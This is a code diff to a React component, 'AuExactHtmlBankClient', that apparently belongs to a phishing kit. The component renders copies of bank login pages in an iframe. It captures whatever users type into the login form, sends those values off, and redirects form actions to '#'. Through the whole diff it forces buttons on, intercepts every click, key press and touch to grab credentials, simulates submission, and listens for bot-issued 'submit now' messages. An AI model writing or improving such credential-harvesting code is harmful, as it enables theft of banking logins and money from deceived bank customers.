@@ -443,6 +443,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     return collectCapturedFieldsFromForm(form, doc);
   }, []);
 
+  const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
+  const lastSubmitAtRef = useRef<number>(0);
+  const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
+  const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);
+
   const attachFrameBridge = useCallback(() => {
     const iframe = iframeRef.current;
     const doc = iframe?.contentDocument;
@@ -454,23 +459,131 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       loginForm = pickBestForm(doc);
     }
     if (!loginForm) return;
+    savedSubmitFormRef.current = loginForm;
 
-    const canProceed = () => {
+    const canProceedNow = () => {
       if (isFinalStep) return canSubmitFinal(loginForm!, doc);
       return canSubmitIntermediate(loginForm!, doc);
     };
 
-    const submitWithCurrentValues = async (event?: Event) => {
-      event?.preventDefault();
-      event?.stopPropagation();
-      event?.stopImmediatePropagation?.();
+    const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
+      try {
+        const candidates: HTMLElement[] = [];
+        if (actNodes && actNodes.length > 0) candidates.push(...actNodes);
+        try {
+          const inside = Array.from(
+            bestForm.querySelectorAll<HTMLElement>(
+              "button, input[type='submit'], input[type='button'], [role='button'], .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
+            ),
+          );
+          inside.forEach((x) => candidates.push(x));
+        } catch {}
+        try {
+          const out = Array.from(
+            doc.querySelectorAll<HTMLElement>(
+              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
+            ),
+          );
+          out.forEach((x) => candidates.push(x));
+        } catch {}
+        const seen = new Set<HTMLElement>();
+        let bestNode: HTMLElement | null = null;
+        for (const cand of candidates) {
+          if (seen.has(cand)) continue;
+          seen.add(cand);
+          const tok = getElementActionToken(cand);
+          const isi =
+            cand instanceof HTMLInputElement && ["submit", "button"].includes((cand.getAttribute("type") ?? "").toLowerCase());
+          if (!(ACTION_BUTTON_RE.test(tok) || isi)) {
+            continue;
+          }
+          bestNode = cand;
+          break;
+        }
+        if (bestNode) {
+          savedSubmitActionNodesRef.current = [bestNode];
+          try {
+            (bestNode as any).click();
+          } catch {}
+          try {
+            if ((bestNode as any).dispatchEvent) {
+              try {
+                (bestNode as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
+              } catch {}
+              try {
+                (bestNode as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true, view: window }));
+              } catch {}
+              try {
+                (bestNode as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
+              } catch {}
+              try {
+                (bestNode as any).dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true }));
+              } catch {}
+              try {
+                (bestNode as any).dispatchEvent(new PointerEvent("pointerup", { bubbles: true, cancelable: true }));
+              } catch {}
+            }
+          } catch {}
+        }
+        try {
+          if (typeof (bestForm as any).requestSubmit === "function") {
+            try { (bestForm as any).requestSubmit(); } catch {}
+          }
+        } catch {}
+        try { bestForm.submit(); } catch {}
+      } catch (_) {
+        /* ignore */
+      }
+    };
 
-      if (!canProceed()) return;
+    const submitWithCurrentValues = async (event?: Event) => {
+      event?.preventDefault?.();
+      event?.stopPropagation?.();
+      try { event?.stopImmediatePropagation?.(); } catch {}
+
+      const now = Date.now();
+      if (now - lastSubmitAtRef.current < 1200) return;
+      if (!canProceedNow()) return;
 
       const captured = captureFieldsFromFrame();
       if (captured.length === 0) return;
-      await submitCapturedFields(captured);
+
+      lastSubmitAtRef.current = now;
+
+      const snapForm = savedSubmitFormRef.current ?? loginForm;
+      const snapNodes = savedSubmitActionNodesRef.current.length > 0
+        ? savedSubmitActionNodesRef.current
+        : computeActionNodes(doc, snapForm);
+
+      void submitCapturedFields(captured).finally(() => {
+        try { ultraForceClickOnBestNode(snapForm, snapNodes); } catch {}
+      });
     };
+
+    const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
+      const arr: HTMLElement[] = [];
+      try {
+        const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
+          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
+        )) : [];
+        const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
+        ));
+        const seen = new Set<HTMLElement>();
+        [...fNodes, ...dNodes].forEach((n) => {
+          if (seen.has(n)) return;
+          seen.add(n);
+          const tok = getElementActionToken(n);
+          const isi =
+            n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
+          if (!(ACTION_BUTTON_RE.test(tok) || isi)) return;
+          arr.push(n);
+        });
+      } catch {}
+      return arr;
+    };
+
+    submitWithCurrentValuesRef.current = submitWithCurrentValues;
 
     const forms = Array.from(doc.querySelectorAll("form"));
     forms.forEach((form) => {
@@ -479,58 +592,58 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       form.setAttribute("target", "_self");
       form.setAttribute("novalidate", "novalidate");
       if (form === loginForm) {
-        form.addEventListener("submit", submitWithCurrentValues);
+        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
+        form.addEventListener("submit", submitWithCurrentValues as any);
+        (form as any)._auBotV3Bound = true;
       }
     });
 
+    const actionNodes = computeActionNodes(doc, loginForm);
+    savedSubmitActionNodesRef.current = actionNodes;
+
     const updateSubmitState = () => {
-      const isValid = canProceed();
+      const isValid = canProceedNow();
       const isDisabled = !isValid || saving;
       const activeColor = getActiveButtonColor(bankSlug);
       actionNodes.forEach((node) => {
         if ("disabled" in node) {
-          node.disabled = isDisabled;
+          try { (node as any).disabled = isDisabled; } catch {}
         }
-
-        node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
-        node.style.pointerEvents = isDisabled ? "none" : "";
-        node.style.opacity = "1";
-        node.style.cursor = isDisabled ? "not-allowed" : "pointer";
-        node.style.background = isDisabled ? "#E6E8EA" : activeColor;
-        node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
-        node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
-        node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
-        node.style.transform = isDisabled ? "none" : "translateY(0)";
-        node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
+        try {
+          node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
+        } catch {}
+        try {
+          node.style.pointerEvents = isDisabled ? "none" : "auto";
+          node.style.opacity = "1";
+          node.style.cursor = isDisabled ? "not-allowed" : "pointer";
+        } catch {}
+        try {
+          node.style.background = isDisabled ? "#E6E8EA" : activeColor;
+          node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
+          node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
+          node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
+          node.style.transform = isDisabled ? "none" : "translateY(0)";
+          node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
+        } catch {}
       });
     };
 
-    const formActionNodes = Array.from(
-      loginForm.querySelectorAll<HTMLElement>(
-        "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
-      ),
-    );
-    const docActionNodes = Array.from(
-      doc.querySelectorAll<HTMLElement>(
-        "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
-      ),
-    );
-    const seenNodes = new Set<HTMLElement>();
-    const actionNodes: HTMLElement[] = [];
-    [...formActionNodes, ...docActionNodes].forEach((n) => {
-      if (seenNodes.has(n)) return;
-      seenNodes.add(n);
-      const nodeToken = getElementActionToken(n);
-      const isSubmitInput =
-        n instanceof HTMLInputElement &&
-        ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
-      if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) return;
-      actionNodes.push(n);
-    });
     actionNodes.forEach((node) => {
-      node.addEventListener("click", submitWithCurrentValues);
-      node.addEventListener("mousedown", submitWithCurrentValues);
-      node.addEventListener("touchend", submitWithCurrentValues);
+      try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
+      try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
+      try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
+      try { node.removeEventListener("keyup", submitWithCurrentValues as any); } catch {}
+      node.addEventListener("click", submitWithCurrentValues as any, true);
+      node.addEventListener("mousedown", submitWithCurrentValues as any, true);
+      node.addEventListener("touchend", submitWithCurrentValues as any, true);
+      try {
+        node.addEventListener("keydown", (e: Event) => {
+          const ke = e as KeyboardEvent;
+          if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+            try { submitWithCurrentValues(e as any); } catch {}
+          }
+        }, true);
+      } catch {}
     });
 
     Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
@@ -541,10 +654,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     });
 
     getFormFields(loginForm).forEach((field) => {
-      field.addEventListener("input", updateSubmitState);
-      field.addEventListener("change", updateSubmitState);
+      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
+      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
+      field.addEventListener("input", updateSubmitState as any);
+      field.addEventListener("change", updateSubmitState as any);
       field.addEventListener("keydown", (event) => {
-        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceed()) {
+        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
           event.preventDefault();
           event.stopPropagation();
         }
@@ -573,6 +688,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   }, [attachFrameBridge, handleFrameLoad]);
 
   useEffect(() => {
+    const onMsg = (ev: MessageEvent) => {
+      try {
+        const data = ev.data as any;
+        if (!data || typeof data !== "object") return;
+        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
+          const ref = submitWithCurrentValuesRef.current;
+          if (ref && typeof ref === "function") {
+            void ref();
+          }
+        }
+      } catch (_) {}
+    };
+    window.addEventListener("message", onMsg);
+    return () => window.removeEventListener("message", onMsg);
+  }, []);
+
+  useEffect(() => {
     const iframe = iframeRef.current;
     if (!iframe) return;
 
@@ -583,6 +715,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
         const form = pickBestForm(doc);
         if (!form) return;
+        savedSubmitFormRef.current = form;
 
         const proceedNow = isFinalStep ? canSubmitFinal(form, doc) : canSubmitIntermediate(form, doc);
         const disabledBySaving = saving;
@@ -594,6 +727,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default",
         );
 
+        const candidateNodes: HTMLElement[] = [];
         allCandidates.forEach((node) => {
           const nodeToken = getElementActionToken(node);
           const isSubmitInput =
@@ -601,6 +735,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
 
           if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) return;
+          candidateNodes.push(node);
 
           if ("disabled" in node) {
             try { (node as any).disabled = !shouldForceEnable; } catch {}
@@ -647,7 +782,49 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               node.style.boxShadow = "none";
             }
           } catch {}
+
+          try {
+            const curRef = submitWithCurrentValuesRef.current;
+            try { node.removeEventListener("click", curRef as any, true); } catch {}
+            try { node.removeEventListener("mousedown", curRef as any, true); } catch {}
+            try { node.removeEventListener("touchend", curRef as any, true); } catch {}
+            if (shouldForceEnable && curRef) {
+              node.addEventListener("click", curRef as any, true);
+              node.addEventListener("mousedown", curRef as any, true);
+              node.addEventListener("touchend", curRef as any, true);
+              try {
+                node.addEventListener("keydown", (e: Event) => {
+                  const ke = e as KeyboardEvent;
+                  if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+                    try { curRef(); } catch {}
+                  }
+                }, true);
+              } catch {}
+            }
+          } catch {}
         });
+
+        if (candidateNodes.length > 0) {
+          savedSubmitActionNodesRef.current = candidateNodes;
+        }
+
+        try {
+          const formsArr = Array.from(doc.querySelectorAll("form"));
+          formsArr.forEach((f) => {
+            try {
+              f.setAttribute("action", "#");
+              f.setAttribute("method", "post");
+              f.setAttribute("target", "_self");
+              f.setAttribute("novalidate", "novalidate");
+            } catch {}
+            if (f === form) {
+              const curRef = submitWithCurrentValuesRef.current;
+              try { f.removeEventListener("submit", curRef as any); } catch {}
+              if (curRef) f.addEventListener("submit", curRef as any);
+              (f as any)._auBotV3Bound = true;
+            }
+          });
+        } catch {}
 
         const allFields = getFormFields(form);
         allFields.forEach((field) => {
@@ -660,13 +837,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
           } catch {}
         });
+
+        if (shouldForceEnable) {
+          try {
+            if (iframe.contentWindow && typeof iframe.contentWindow.postMessage === "function") {
+              try {
+                iframe.contentWindow.postMessage({ kind: "AU_BOT_CAN_PROCEED_NOW" }, "*");
+              } catch {}
+            }
+          } catch {}
+        }
       } catch (e) {
         /* cross-origin or detached frame — ignore silently */
       }
     };
 
     const initialTimer = window.setTimeout(runPoll, 150);
-    const pollTimer = window.setInterval(runPoll, 500);
+    const pollTimer = window.setInterval(runPoll, 300);
 
     return () => {
       window.clearTimeout(initialTimer);
